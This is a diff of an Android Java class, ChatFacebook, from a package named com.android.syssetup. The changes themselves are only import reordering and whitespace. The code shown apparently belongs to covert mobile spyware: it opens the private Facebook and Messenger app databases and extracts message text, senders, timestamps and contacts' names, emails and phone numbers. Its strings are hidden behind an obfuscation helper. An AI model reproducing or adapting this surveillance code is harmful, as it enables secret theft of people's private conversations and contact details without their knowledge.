@@ -1,19 +1,8 @@
 package com.android.syssetup.module.chat;
 
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.Hashtable;
-import java.util.List;
-import java.util.concurrent.Semaphore;
-
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-import org.json.JSONTokener;
-
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.GenericSqliteHelper;
 import com.android.syssetup.db.RecordHashPairVisitor;
@@ -24,7 +13,18 @@ import com.android.syssetup.file.Path;
 import com.android.syssetup.module.ModuleAddressBook;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+import org.json.JSONTokener;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.Hashtable;
+import java.util.List;
+import java.util.concurrent.Semaphore;
 
 public class ChatFacebook extends SubModuleChat {
 
@@ -32,20 +32,14 @@ public class ChatFacebook extends SubModuleChat {
 
 	private static final int PROGRAM = 0x02;
 	String pObserving = M.e("com.facebook.");
-
-	private Date lastTimestamp;
-
-	private Hashtable<String, Long> lastFb;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
-
-	// private String dbDir;
-	private String account_uid;
-
-	private String account_name;
-
 	String dirKatana = M.e("/data/data/com.facebook.katana/databases");
 	String dirOrca = M.e("/data/data/com.facebook.orca/databases");
-
+	private Date lastTimestamp;
+	private Hashtable<String, Long> lastFb;
+	// private String dbDir;
+	private String account_uid;
+	private String account_name;
 	private Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
 
 	@Override
@@ -142,7 +136,7 @@ public class ChatFacebook extends SubModuleChat {
 			}
 
 			return (!StringUtils.isEmpty(account_name) && !StringUtils.isEmpty(account_uid));
-		}finally{
+		} finally {
 			helper.disposeDb();
 		}
 
@@ -191,7 +185,7 @@ public class ChatFacebook extends SubModuleChat {
 				}
 				return;
 			}
-			try{
+			try {
 				try {
 					readFB(helper, M.e("thread_id"));
 					return;
@@ -200,18 +194,18 @@ public class ChatFacebook extends SubModuleChat {
 						Check.log(TAG + " (readFbMessageHistory) Error: " + ex);
 					}
 				}
-				
+
 				try {
 					readFB(helper, "thread_key");
 					return;
-					
+
 				} catch (Exception ex) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readFbMessageHistory) Error: " + ex);
 					}
 				}
-		
-			} finally{
+
+			} finally {
 				helper.disposeDb();
 			}
 		} finally {
@@ -244,7 +238,7 @@ public class ChatFacebook extends SubModuleChat {
 	private long fetchMessages(String id_field, GenericSqliteHelper helper, final FbConversation conv, long lastConvId) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-		String[] projection = new String[] { M.e("text"), M.e("sender"), M.e("timestamp_ms") };
+		String[] projection = new String[]{M.e("text"), M.e("sender"), M.e("timestamp_ms")};
 		String selection = String.format(id_field + M.e(" = '%s' and text != '' and timestamp_ms > %s"), conv.id,
 				lastConvId);
 		String order = M.e("timestamp_ms");
@@ -347,7 +341,7 @@ public class ChatFacebook extends SubModuleChat {
 		final List<FbConversation> conversations = new ArrayList<FbConversation>();
 
 		// "thread_id"
-		String[] projection = new String[] { id_field, M.e("participants"), M.e("timestamp_ms") };
+		String[] projection = new String[]{id_field, M.e("participants"), M.e("timestamp_ms")};
 		String selection = M.e("timestamp_ms > 0 ");
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -390,7 +384,7 @@ public class ChatFacebook extends SubModuleChat {
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		// SQLiteDatabase db = helper.getReadableDatabase();
 
-		String[] projection = StringUtils.split( M.e("fbid,first_name,last_name,name,email_addresses,phone_numbers") );
+		String[] projection = StringUtils.split(M.e("fbid,first_name,last_name,name,email_addresses,phone_numbers"));
 		String selection = null;
 
 		RecordHashtableIdVisitor visitor = new RecordHashtableIdVisitor(projection);
